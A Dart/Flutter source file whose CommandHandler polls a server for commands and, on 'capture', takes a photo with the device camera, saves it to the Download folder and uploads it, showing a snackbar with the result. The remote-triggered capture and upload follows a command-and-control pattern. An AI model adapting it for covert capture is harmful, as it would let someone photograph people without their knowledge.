// ignore_for_file: use_build_context_synchronously

import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'api_service.dart';

class CommandHandler {
  final ApiService apiService;

  CommandHandler(this.apiService);

  Future<void> processCommand(BuildContext context, List<CameraDescription> cameras) async {
    String command = await apiService.fetchCommand();
    if (command == 'capture') {
      captureAndUploadImage(context, cameras);
    }
  }

  Future<void> captureAndUploadImage(BuildContext context, List<CameraDescription> cameras) async {
    if (cameras.isEmpty) {
      if (kDebugMode) {
        print('No cameras available');
      }
      return;
    }

    final CameraController controller = CameraController(cameras[0], ResolutionPreset.high);
    await controller.initialize();

    const String imagePath = '/storage/emulated/0/Download/captured_image.jpg';

    try {
      await controller.takePicture().then((XFile file) async {
        await file.saveTo(imagePath);
        bool uploaded = await apiService.uploadImage(imagePath);

        if (uploaded) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('Image uploaded successfully!')),
          );
        } else {
          // ignore: duplicate_ignore
          // ignore: use_build_context_synchronously
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('Failed to upload image')),
          );
        }
      });
    } catch (e) {
      if (kDebugMode) {
        print('Error capturing image: $e');
      }
    } finally {
      await controller.dispose();
    }
  }
}
